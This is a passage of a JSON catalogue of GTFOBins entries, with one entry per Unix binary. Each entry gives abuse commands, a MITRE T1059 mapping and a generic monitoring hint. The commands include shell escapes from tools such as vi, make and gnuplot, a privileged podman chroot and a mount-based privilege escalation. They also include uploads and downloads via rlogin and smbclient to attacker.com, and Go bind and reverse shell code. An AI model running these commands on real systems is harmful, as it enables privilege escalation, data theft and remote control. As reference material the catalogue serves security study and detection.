            "detection": [
                "Monitor dash usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/dash/"
                }
            ]
        },
        {
            "name": "xmodmap",
            "description": "Unix binary xmodmap.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "xmodmap -v /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor xmodmap usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/xmodmap/"
                }
            ]
        },
        {
            "name": "apport-cli",
            "description": "Unix binary apport-cli.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "apport-cli -f\n1\n2\nv"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor apport-cli usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/apport-cli/"
                }
            ]
        },
        {
            "name": "run-parts",
            "description": "Unix binary run-parts.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "run-parts --new-session --regex '^sh$' /bin"
                },
                {
                    "label": "SHELL: ",
                    "code": "cp /bin/sh /path/to/temp-dir/\nrun-parts /path/to/temp-dir/"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor run-parts usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/run-parts/"
                }
            ]
        },
        {
            "name": "valgrind",
            "description": "Unix binary valgrind.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "valgrind /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor valgrind usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/valgrind/"
                }
            ]
        },
        {
            "name": "msfconsole",
            "description": "Unix binary msfconsole.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "msfconsole\nirb"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor msfconsole usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/msfconsole/"
                }
            ]
        },
        {
            "name": "wireshark",
            "description": "Unix binary wireshark.",
            "categories": [
                "file-write",
                "execute"
            ],
            "commands": [
                {
                    "label": "FILE-WRITE: ",
                    "code": "wireshark -c 1 -i lo -k -f 'udp port 12345' &\necho DATA | nc -u 127.127.127.127 12345"
                },
                {
                    "label": "INHERIT: ",
                    "code": "wireshark"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor wireshark usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/wireshark/"
                }
            ]
        },
        {
            "name": "podman",
            "description": "Unix binary podman.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor podman usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/podman/"
                }
            ]
        },
        {
            "name": "dig",
            "description": "Unix binary dig.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "dig -f /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor dig usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/dig/"
                }
            ]
        },
        {
            "name": "msgattrib",
            "description": "Unix binary msgattrib.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "msgattrib -P /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor msgattrib usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/msgattrib/"
                }
            ]
        },
        {
            "name": "rlogin",
            "description": "Unix binary rlogin.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "UPLOAD: ",
                    "code": "rlogin -l DATA -p 12345 attacker.com"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor rlogin usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/rlogin/"
                }
            ]
        },
        {
            "name": "vi",
            "description": "Unix binary vi.",
            "categories": [
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "vi /path/to/input-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "vi /path/to/output-file\niDATA\n^[\nw"
                },
                {
                    "label": "SHELL: ",
                    "code": "vi -c ':!/bin/sh' /dev/null"
                },
                {
                    "label": "SHELL: ",
                    "code": "vi -c ':shell'"
                },
                {
                    "label": "SHELL: ",
                    "code": "vi -c ':set shell=/bin/sh | shell'"
                },
                {
                    "label": "SHELL: ",
                    "code": "vi -c :terminal /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor vi usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/vi/"
                }
            ]
        },
        {
            "name": "ansible-test",
            "description": "Unix binary ansible-test.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "ansible-test shell"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ansible-test usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ansible-test/"
                }
            ]
        },
        {
            "name": "basenc",
            "description": "Unix binary basenc.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "basenc --base64 /path/to/input-file | basenc -d --base64"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor basenc usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/basenc/"
                }
            ]
        },
        {
            "name": "openvpn",
            "description": "Unix binary openvpn.",
            "categories": [
                "file-read",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "openvpn --config /path/to/input-file"
                },
                {
                    "label": "SHELL: ",
                    "code": "openvpn --dev null --script-security 2 --up '/bin/sh -s'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor openvpn usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/openvpn/"
                }
            ]
        },
        {
            "name": "multitime",
            "description": "Unix binary multitime.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "multitime /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor multitime usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/multitime/"
                }
            ]
        },
        {
            "name": "loginctl",
            "description": "Unix binary loginctl.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "loginctl user-status\n!/bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor loginctl usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/loginctl/"
                }
            ]
        },
        {
            "name": "pr",
            "description": "Unix binary pr.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "pr -T /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor pr usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/pr/"
                }
            ]
        },
        {
            "name": "env",
            "description": "Unix binary env.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "env /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor env usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/env/"
                }
            ]
        },
        {
            "name": "go",
            "description": "Unix binary go.",
            "categories": [
                "reverse-shell",
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "BIND-SHELL: ",
                    "code": "echo -e 'package main\\nimport (\\n\\t\"os\"\\n\\t\"syscall\"\\n)\\n\\nfunc main(){\\n\\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\\n\\taddr := &syscall.SockaddrInet4{Port: 12345}\\n\\tcopy(addr.Addr[:], []byte{0,0,0,0})\\n\\tsyscall.Bind(fd, addr)\\n\\tsyscall.Listen(fd, 1)\\n\\tnfd, _, _ := syscall.Accept(fd)\\n\\tsyscall.Dup2(nfd, 0)\\n\\tsyscall.Dup2(nfd, 1)\\n\\tsyscall.Dup2(nfd, 2)\\n\\tsyscall.Exec(\"/bin/sh\", []string{\"/bin/sh\", \"-i\"}, os.Environ())\\n}' >/path/to/temp-file.go\ngo run /path/to/temp-file.go"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "echo -e 'package main\\nimport (\\n\\t\"fmt\"\\n\\t\"os\"\\n)\\n\\nfunc main(){\\n\\tb, _ := os.ReadFile(\"/path/to/input-file\")\\n\\tfmt.Print(string(b))\\n}' >/path/to/temp-file.go\ngo run /path/to/temp-file.go"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "echo -e 'package main\\nimport \"os\"\\nfunc main(){\\n\\tf, _ := os.OpenFile(\"/path/to/output-file\", os.O_RDWR|os.O_CREATE, 0644)\\n\\tf.Write([]byte(\"DATA\\\\n\"))\\n\\tf.Close()\\n}' >/path/to/temp-file.go\ngo run /path/to/temp-file.go"
                },
                {
                    "label": "REVERSE-SHELL: ",
                    "code": "echo -e 'package main\\nimport (\\n\\t\"os\"\\n\\t\"net\"\\n\\t\"syscall\"\\n)\\n\\nfunc main(){\\n\\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\\n\\tip := net.ParseIP(\"attacker.com\").To4()\\n\\taddr := &syscall.SockaddrInet4{Port: 12345}\\n\\tcopy(addr.Addr[:], ip)\\n\\tsyscall.Connect(fd, addr)\\n\\tsyscall.Dup2(fd, 0)\\n\\tsyscall.Dup2(fd, 1)\\n\\tsyscall.Dup2(fd, 2)\\n\\tsyscall.Exec(\"/bin/sh\", []string{\"/bin/sh\", \"-i\"}, os.Environ())\\n}' >/path/to/temp-file.go\ngo run /path/to/temp-file.go"
                },
                {
                    "label": "SHELL: ",
                    "code": "echo -e 'package main\\nimport \"syscall\"\\nfunc main(){\\n\\tsyscall.Exec(\"/bin/sh\", []string{\"/bin/sh\", \"-i\"}, []string{})\\n}' >/path/to/temp-file.go\ngo run /path/to/temp-file.go"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor go usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/go/"
                }
            ]
        },
        {
            "name": "systemctl",
            "description": "Unix binary systemctl.",
            "categories": [
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "systemctl"
                },
                {
                    "label": "SHELL: ",
                    "code": "echo '[Service]\nType=oneshot\nExecStart=/path/to/command\n[Install]\nWantedBy=multi-user.target' >/path/to/temp-file.service\nsystemctl link /path/to/temp-file.service\nsystemctl enable --now /path/to/temp-file.service"
                },
                {
                    "label": "SHELL: ",
                    "code": "echo /bin/sh >/path/to/temp-file\nchmod +x /path/to/temp-file\nSYSTEMD_EDITOR=/path/to/temp-file systemctl edit basic.target"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor systemctl usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/systemctl/"
                }
            ]
        },
        {
            "name": "tac",
            "description": "Unix binary tac.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "tac -s 'RANDOM' /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor tac usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/tac/"
                }
            ]
        },
        {
            "name": "fping",
            "description": "Unix binary fping.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "fping -f /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor fping usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/fping/"
                }
            ]
        },
        {
            "name": "unexpand",
            "description": "Unix binary unexpand.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "unexpand -t999 /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor unexpand usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/unexpand/"
                }
            ]
        },
        {
            "name": "sg",
            "description": "Unix binary sg.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "sg $(id -ng)"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor sg usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/sg/"
                }
            ]
        },
        {
            "name": "minicom",
            "description": "Unix binary minicom.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "minicom -D /dev/null"
                },
                {
                    "label": "SHELL: ",
                    "code": "echo '! exec /bin/sh </dev/tty 1>/dev/tty 2>/dev/tty' >/path/to/temp-file\nminicom -D /dev/null -S /path/to/temp-file\nreset^J"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor minicom usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/minicom/"
                }
            ]
        },
        {
            "name": "ksshell",
            "description": "Unix binary ksshell.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "ksshell -i /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ksshell usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ksshell/"
                }
            ]
        },
        {
            "name": "eb",
            "description": "Unix binary eb.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "eb logs"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor eb usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/eb/"
                }
            ]
        },
        {
            "name": "joe",
            "description": "Unix binary joe.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "joe\n^K!/bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor joe usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/joe/"
                }
            ]
        },
        {
            "name": "readelf",
            "description": "Unix binary readelf.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "readelf -a @/path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor readelf usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/readelf/"
                }
            ]
        },
        {
            "name": "puppet",
            "description": "Unix binary puppet.",
            "categories": [
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "puppet filebucket -l diff /dev/null /path/to/input-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "puppet apply -e 'file { \"/path/to/output-file\": content => \"DATA\" }'"
                },
                {
                    "label": "SHELL: ",
                    "code": "puppet apply -e \"exec { '/bin/sh <$(tty) >$(tty) 2>$(tty)': }\""
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor puppet usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/puppet/"
                }
            ]
        },
        {
            "name": "make",
            "description": "Unix binary make.",
            "categories": [
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "make -s --eval='$(file >/dev/stdout,$(file </path/to/input-file))' ."
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "make -s --eval='$(file >/path/to/output-file,DATA)' ."
                },
                {
                    "label": "SHELL: ",
                    "code": "make --eval='$(shell /bin/sh 1>&0)' ."
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor make usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/make/"
                }
            ]
        },
        {
            "name": "bzip2",
            "description": "Unix binary bzip2.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "bzip2 -c /path/to/input-file | bzip2 -d"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor bzip2 usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/bzip2/"
                }
            ]
        },
        {
            "name": "ul",
            "description": "Unix binary ul.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "ul /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ul usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ul/"
                }
            ]
        },
        {
            "name": "dosbox",
            "description": "Unix binary dosbox.",
            "categories": [
                "file-read",
                "file-write"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "dosbox -c 'mount c /' -c 'type c:\\path\\to\\input'"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "dosbox -c 'mount c /' -c 'copy c:\\path\\to\\input c:\\path\\to\\output' -c exit\ncat /path/to/OUTPUT"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "dosbox -c 'mount c /' -c \"echo DATA >c:\\path\\to\\output\" -c exit"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor dosbox usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/dosbox/"
                }
            ]
        },
        {
            "name": "tic",
            "description": "Unix binary tic.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "tic -C /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor tic usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/tic/"
                }
            ]
        },
        {
            "name": "check_ssl_cert",
            "description": "Unix binary check_ssl_cert.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file\nchmod +x /path/to/temp-file\ncheck_ssl_cert --grep-bin /path/to/temp-file -H x"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor check_ssl_cert usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/check_ssl_cert/"
                }
            ]
        },
        {
            "name": "zcat",
            "description": "Unix binary zcat.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "zcat -f /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor zcat usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/zcat/"
                }
            ]
        },
        {
            "name": "gnuplot",
            "description": "Unix binary gnuplot.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "gnuplot -e 'system(\"/bin/sh 1>&0\")'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor gnuplot usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/gnuplot/"
                }
            ]
        },
        {
            "name": "cpan",
            "description": "Unix binary cpan.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "cpan\n! ..."
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor cpan usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/cpan/"
                }
            ]
        },
        {
            "name": "pg",
            "description": "Unix binary pg.",
            "categories": [
                "file-read",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "pg /path/to/input-file"
                },
                {
                    "label": "SHELL: ",
                    "code": "pg /etc/hosts\n!/bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor pg usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/pg/"
                }
            ]
        },
        {
            "name": "procmail",
            "description": "Unix binary procmail.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "echo -e ':0\\n| /path/to/command >/path/to/temp-file\nprocmail -m /path/to/temp-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor procmail usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/procmail/"
                }
            ]
        },
        {
            "name": "setlock",
            "description": "Unix binary setlock.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "setlock - /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor setlock usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/setlock/"
                }
            ]
        },
        {
            "name": "smbclient",
            "description": "Unix binary smbclient.",
            "categories": [
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "DOWNLOAD: ",
                    "code": "smbclient '\\\\attacker.com\\share' -c 'get /path/to/input-file /path/to/output-file'"
                },
                {
                    "label": "SHELL: ",
                    "code": "smbclient '\\\\host\\share'\n!/bin/sh"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "smbclient '\\\\attacker.com\\share' -c 'put /path/to/input-file /path/to/output-file'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor smbclient usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/smbclient/"
                }
            ]
        },
        {
            "name": "pdftex",
            "description": "Unix binary pdftex.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "pdftex --shell-escape '\\write18{/bin/sh}\\end'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor pdftex usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/pdftex/"
                }
            ]
        },
        {
            "name": "highlight",
            "description": "Unix binary highlight.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "highlight --no-doc --failsafe /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor highlight usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/highlight/"
                }
            ]
        },
        {
            "name": "borg",
            "description": "Unix binary borg.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "borg extract @:/::: --rsh \"/bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'\""
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor borg usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/borg/"
                }
            ]
        },
        {
            "name": "doas",
            "description": "Unix binary doas.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "doas -u root /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor doas usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/doas/"
                }
            ]
        },
        {
            "name": "mount",
            "description": "Unix binary mount.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "PRIVILEGE-ESCALATION: ",
                    "code": "mount -o bind /bin/sh /bin/mount\nmount"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor mount usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/mount/"
                }
            ]
        },
        {
            "name": "ssh-agent",
